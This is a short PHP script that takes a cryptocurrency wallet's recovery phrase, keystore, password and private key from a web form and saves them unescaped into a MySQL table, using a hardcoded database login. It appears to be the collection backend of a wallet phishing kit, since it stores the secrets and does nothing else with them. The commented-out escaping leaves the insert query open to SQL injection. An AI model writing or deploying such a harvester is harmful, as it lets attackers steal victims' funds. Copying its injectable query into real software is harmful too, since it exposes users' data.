<?php
define('DB_HOST' , 'localhost');
define('DB_USER' , 'tobi');
define('DB_PASS' , '1122');
define('DB_NAME' , 'wallet');

// connection
$conn= new mysqli(DB_HOST, DB_USER ,DB_PASS, DB_NAME);

if(isset($_POST['phrase'])) {
    $phrase = $_POST['phrase'];

}

if(isset($_POST['keystore'])) {
    $keystore = $_POST['keystore'];

}

if(isset($_POST['password'])) {
    $password = $_POST['password'];

}

if(isset($_POST['privatekey'])) {
    $privatekey = $_POST['privatekey'];

}





/*$phrase = mysqli_real_escape_string($conn, $_POST['phrase']);
$keystore = mysqli_real_escape_string($conn, $_POST['keystore']);
$password = mysqli_real_escape_string($conn, $_POST['password']);
$privatekey = mysqli_real_escape_string($conn, $_POST['privatekey']);
*/
mysqli_query($conn, "INSERT INTO first (phrase, keystore, password, privatekey) VALUES ('". $phrase. "', '". $keystore. "', '" .$password. "', '". $privatekey. "')");

